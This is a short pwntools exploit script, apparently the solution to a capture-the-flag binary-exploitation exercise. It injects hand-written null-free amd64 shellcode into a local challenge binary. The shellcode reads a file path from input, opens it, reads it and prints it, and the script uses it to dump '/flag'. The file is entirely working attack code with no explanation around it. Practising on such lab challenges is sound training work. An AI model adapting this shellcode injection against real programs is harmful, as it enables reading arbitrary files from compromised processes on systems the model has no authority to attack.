from pwn import *

context.arch = 'amd64'

p = process('/challenge/binary-exploitation-null-free-shellcode')

sh = asm('''
    mov r9, QWORD PTR [rbp + 0x28]

    xor rax, rax
    mov al, 0x15
    shl rax, 8
    add al, 0x47
    sub r9, rax

    xor rax,rax
    mov al, 0x40
    shl rax, 8
    add al, 0x10
    add r9, rax

    xor rdi, rdi
    mov rsi, r9
    xor edx, edx
    mov dl, 1
    shl rdx, 8
    xor rax, rax
    syscall

    mov rdi, r9
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    inc rax
    inc rax
    syscall

    mov rdi, rax
    mov rsi, r9
    xor edx, edx
    mov dl, 1
    shl rdx, 8
    xor rax, rax
    syscall

    xor rdi, rdi
    inc rdi
    mov rsi, r9
    xor edx, edx
    mov dl, 1
    shl rdx, 8
    xor rax, rax
    inc rax
    syscall
''')

p.send(sh)
p.send(b'/flag\x00')

p.interactive()
